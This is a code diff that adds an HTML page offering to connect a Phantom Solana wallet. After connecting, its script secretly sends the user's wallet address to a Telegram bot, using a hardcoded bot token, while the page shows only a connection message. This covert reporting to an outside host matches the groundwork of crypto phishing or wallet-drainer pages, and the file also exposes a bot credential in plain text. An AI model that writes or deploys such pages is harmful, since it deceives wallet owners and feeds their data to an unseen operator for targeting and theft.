@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Connect to Phantom Wallet</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/solana-web3.js/1.30.0/solana-web3.min.js"></script>
+</head>
+<body>
+    <h1>Connect Your Solana Wallet</h1>
+    <button id="connectButton">🔗 Connect Phantom Wallet</button>
+    <p id="status"></p>
+
+    <script>
+        document.getElementById('connectButton').addEventListener('click', async () => {
+            try {
+                if (!window.solana) {
+                    alert("Please install Phantom Wallet.");
+                    return;
+                }
+
+                // Connect to Phantom
+                const provider = window.solana;
+                const resp = await provider.connect();
+                
+                // Get public key
+                const walletAddress = resp.publicKey.toString();
+                document.getElementById('status').innerText = `✅ Connected: ${walletAddress}`;
+
+                // Send wallet address to Telegram bot
+                const botToken = "7708216067:AAF2Li2xV-2ZIF9dhpJsy4_LQGFIZhSmW5U";
+                const chatId = YOUR_CHAT_ID;  // Replace with Telegram user ID
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=Wallet Connected: ${walletAddress}`);
+
+            } catch (err) {
+                console.error("Connection Failed", err);
+                document.getElementById('status').innerText = "❌ Connection Failed";
+            }
+        });
+    </script>
+</body>
+</html>
